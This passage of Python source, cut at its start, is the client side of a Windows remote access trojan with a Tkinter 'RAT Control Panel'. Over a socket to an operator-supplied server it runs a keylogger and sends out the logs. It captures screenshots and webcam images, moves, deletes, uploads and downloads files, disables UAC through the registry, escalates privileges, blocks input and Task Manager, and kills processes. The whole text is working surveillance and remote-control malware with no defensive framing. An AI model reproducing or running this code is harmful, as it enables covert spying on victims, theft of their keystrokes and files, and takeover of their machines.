            
            elif command == 'systeminfo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                s.send(output.encode())
            
            elif command == 'sendmessage':
                text = s.recv(6000).decode()
                title = s.recv(6000).decode()
                s.send('MessageBox has appeared'.encode())
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
            
            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                s.send("Keyboard and mouse are disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                global kbrd
                kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                s.send("Keyboard is disabled".encode())
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                global mousedbl
                mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                s.send("Mouse is disabled".encode())
            
            elif command == 'disableUAC':
                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd = False
                s.send("Mouse and keyboard are unblocked".encode())
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl = False
                s.send("Mouse is enabled".encode())

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                s.send("Keyboard and mouse are enabled".encode())
                
            elif command == 'turnoffmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned off".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
            
            elif command == 'turnonmon':
                s.send(f"{socket.gethostbyname(socket.gethostname())}'s monitor was turned on".encode())
                user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            
            elif command == 'extendrights':
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
                s.send(sending.encode())
            
            elif command == 'isuseradmin':
                if ctypes.windll.shell32.IsUserAnAdmin() == 1:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
                    s.send(sending.encode())
                else:
                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
                    s.send(sending.encode())

            elif command == 'keyscan_start':
                global klgr
                klgr = True
                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                Thread(target=self.keylogger, daemon=True).start()
                s.send("Keylogger is started".encode())
            
            elif command == 'send_logs':
                try:
                    f = open("keylogs.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    s.send(str(lines).encode())
                    os.remove('keylogs.txt')
                except:
                    self.errorsend()
            
            elif command == 'stop_keylogger':
                klgr = False
                s.send("The session of keylogger is terminated".encode())
            
            elif command == 'cpu_cores':
                output = os.cpu_count()
                s.send(str(output).encode())

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    s.send(f'{command[8:]} was successfully deleted'.encode())
                except:
                    self.errorsend()
            
            elif command[:8] == 'editfile':
                try:
                    with open(command.split(" ")[1], 'a') as f:
                        f.write(command.split(" ")[2])
                        f.close()
                    sending = f'{command.split(" ")[2]} was written to {command.split(" ")[1]}'
                    s.send(sending.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cp':
                try: 
                    shutil.copyfile(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'{command.split(" ")[1]} was copied to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'mv':
                try:
                    shutil.move(command.split(" ")[1], command.split(" ")[2])
                    s.send(f'File was moved from {command.split(" ")[1]} to {command.split(" ")[2]}'.encode())
                except:
                    self.errorsend()
            
            elif command[:2] == 'cd':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except:
                    s.send("No such directory".encode())
            
            elif command == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                s.send(curdir.encode())
            
            elif command == 'dir':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    s.send(output.encode())
                except:
                    self.errorsend()
            
            elif command[1:2] == ':':
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    s.send(curdir.encode())
                except: 
                    s.send("No such directory".encode())
            
            elif command[:10] == 'createfile':
                kernel32.CreateFileW(command[11:], GENERIC_WRITE & GENERIC_READ, 
                FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                None, CREATE_ALWAYS , 0, 0)
                s.send(f'{command[11:]} was created'.encode())

            elif command[:10] == 'searchfile':
                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
                    if x.endswith(command.split(" ")[1]):
                        path = os.path.abspath(x)
                        s.send(str(path).encode())
                    else:
                        continue
            
            elif command == 'curpid':
                pid = os.getpid()
                s.send(str(pid).encode())
            
            elif command == 'drivers':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                s.send(str(drives).encode())
            
            elif command[:4] == 'kill':
                try:
                    os.system(f'TASKKILL /F /im {command[5:]}')
                    s.send(f'{command[5:]} was terminated'.encode())
                except:
                    self.errorsend()
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
                s.send()
            
            elif command == 'disabletaskmgr':
                global block
                block = True
                Thread(target=self.block_task_manager, daemon=True).start()
                s.send("Task Manager is disabled".encode())
            
            elif command == 'enabletaskmgr':
                block = False
                s.send("Task Manager is enabled".encode())
            
            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                s.send(str(current_time).encode())
            
            elif command[:9] == 'startfile':
                try:
                    s.send(f'{command[10:]} was started'.encode())
                    os.startfile(command[10:])
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'upload':
                filename = s.recv(6000)
                newfile = open(filename, 'wb')
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()
            
            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    s.send(f'Directory {command[6:]} was created'.encode())
                except:
                    self.errorsend()
            
            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    s.send(f'Directory {command[6:]} was removed'.encode())
                except:
                    self.errorsend()
            
            elif command == 'browser':
                quiery = s.recv(6000)
                quiery = quiery.decode()
                try:
                    if re.search(r'\.', quiery):
                        webbrowser.open_new_tab('https://' + quiery)
                    elif re.search(r'\ ', quiery):
                        webbrowser.open_new_tab('https://yandex.ru/search/?text='+quiery)
                    else:
                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
                    s.send("The tab is opened".encode())
                except:
                    self.errorsend()
            
            elif command == 'screenshot':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    pyautogui.screenshot(file)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()
            
            elif command == 'webcam_snap':
                try:
                    file = f'{random.randint(111111, 444444)}.png'
                    file2 = f'{random.randint(555555, 999999)}.png'
                    global return_value, i
                    cam = cv2.VideoCapture(0)
                    for i in range(1):
                        return_value, image = cam.read()
                        filename = cv2.imwrite(f'{file}', image)
                    del(cam)
                    image = Image.open(file)
                    new_image = image.resize((1920, 1080))
                    new_image.save(file2)
                    file = open(file2, 'rb')
                    data = file.read()
                    s.send(data)
                except:
                    self.errorsend()

            elif command == 'exit':
                print("You are free from our control now ;)")
                s.send(b"exit")
                break



class RATInterface:
    def __init__(self, root):
        self.root = root
        self.root.title("RAT Control Panel")
        
        # Set background color for the main window
        self.root.configure(bg="#f0f0f0")

        # Create a frame for organizing widgets with a light background color
        self.frame = tk.Frame(root, bg="#f0f0f0")
        self.frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        # Create buttons with styling
        self.connect_button = tk.Button(self.frame, text="Connect", command=self.connect_to_server, bg="#4CAF50", fg="white", padx=10, pady=5, font=("Helvetica", 10))
        self.connect_button.grid(row=0, column=0, padx=(5, 2), pady=5, sticky="nsew")

        self.disconnect_button = tk.Button(self.frame, text="Disconnect", command=self.disconnect_from_server, state=tk.DISABLED, bg="#FF5733", fg="white", padx=10, pady=5, font=("Helvetica", 10))
        self.disconnect_button.grid(row=0, column=1, padx=(2, 5), pady=5, sticky="nsew")

        # Create labels and entries with styling
        self.ip_label = tk.Label(self.frame, text="Server IP:", bg="#f0f0f0", font=("Helvetica", 10))
        self.ip_label.grid(row=1, column=0, padx=(5, 2), pady=(10, 5), sticky="e")

        self.ip_entry = tk.Entry(self.frame, bg="white", relief="solid", bd=1, font=("Helvetica", 10))
        self.ip_entry.grid(row=1, column=1, padx=(2, 5), pady=(10, 5), sticky="ew")

        self.port_label = tk.Label(self.frame, text="Port:", bg="#f0f0f0", font=("Helvetica", 10))
        self.port_label.grid(row=2, column=0, padx=(3, 2), pady=5, sticky="e")

        self.port_entry = tk.Entry(self.frame, bg="white", relief="solid", bd=1, font=("Helvetica", 10))
        self.port_entry.grid(row=2, column=1, padx=(1, 5), pady=5, sticky="ew")

        # Set row and column weights to make widgets expand proportionally
        self.frame.grid_rowconfigure(1, weight=1)
        self.frame.grid_columnconfigure((0, 1), weight=1)

        # Bind the resize event to a function that adjusts the font size
        self.root.bind('<Configure>', self.adjust_font_size)

    def adjust_font_size(self, event):
        # Calculate the new font size based on window width
        new_font_size = max(int(self.root.winfo_width() / 50), 10)
        
        # Update font size for all widgets
        for widget in [self.connect_button, self.disconnect_button, self.ip_label, self.ip_entry, self.port_label, self.port_entry]:
            widget.config(font=("Helvetica", new_font_size))

    def connect_to_server(self):
        ip = self.ip_entry.get()
        port = int(self.port_entry.get())
        try:
            # Mocking RAT_CLIENT and its methods
            self.rat_client = RAT_CLIENT(ip, port)
            self.rat_client.build_connection()
            messagebox.showinfo("Success", "Connected to server successfully!")
            self.root.destroy()  # Close the window after successful connection
            self.rat_client.execute()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to connect: {str(e)}")

    def disconnect_from_server(self):
        try:
            self.rat_client.s.send(b"exit")
            self.rat_client.s.close()
            messagebox.showinfo("Success", "Disconnected from server!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to disconnect: {str(e)}")

def main():
    root = tk.Tk()
    app = RATInterface(root)
    root.mainloop()

if __name__ == '__main__':
    main()
